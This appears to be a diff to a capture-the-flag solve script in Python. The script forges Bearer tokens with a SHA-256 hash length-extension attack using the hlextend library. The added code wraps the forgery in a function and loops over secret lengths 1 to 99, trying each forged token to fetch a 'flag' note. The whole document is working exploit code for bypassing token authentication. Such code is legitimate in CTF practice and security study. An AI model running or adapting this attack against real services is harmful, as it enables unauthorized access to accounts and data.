@@ -6,7 +6,8 @@ import base64
 
 # Use a session object
 session = requests.Session()
-url = "http://localhost:80"
+# url = "https://gcpayvzl.web.ctf.uscybergames.com"
+url = "http://localhost:80"  # Change to your local server if needed
 
 def register(username, password):
     data = {"username": username, "password": password}
@@ -80,8 +81,23 @@ forged = hl_sha.extend(
 
 new_token = base64.b64encode(forged + hl_sha.hexdigest().encode())
 
+def forge_token(input_token, append_data, secret_length):
+    hl_sha = hlextend.new("sha256")
+    forged = hl_sha.extend(
+        append_data, # appendData
+        input_token[:-HMAC_HEX_LENGTH], # knownData
+        secret_length, # secretLength
+        input_token[-HMAC_HEX_LENGTH:].decode('utf-8'), # startHash
+    )
+
+    new_token = base64.b64encode(forged + hl_sha.hexdigest().encode())
+    return new_token
+
 print(f"New forged token: {new_token.decode()}")
 
-session.headers.update({"Authorization": f"Bearer {new_token.decode()}"})
-print(list_notes())
-print(get_note("flag"))
+for i in range(1, 100):
+    print(i)
+    new_token = forge_token(token_decoded, b"in", i)
+    session.headers.update({"Authorization": f"Bearer {new_token.decode()}"})
+    print(list_notes())
+    print(get_note("flag"))
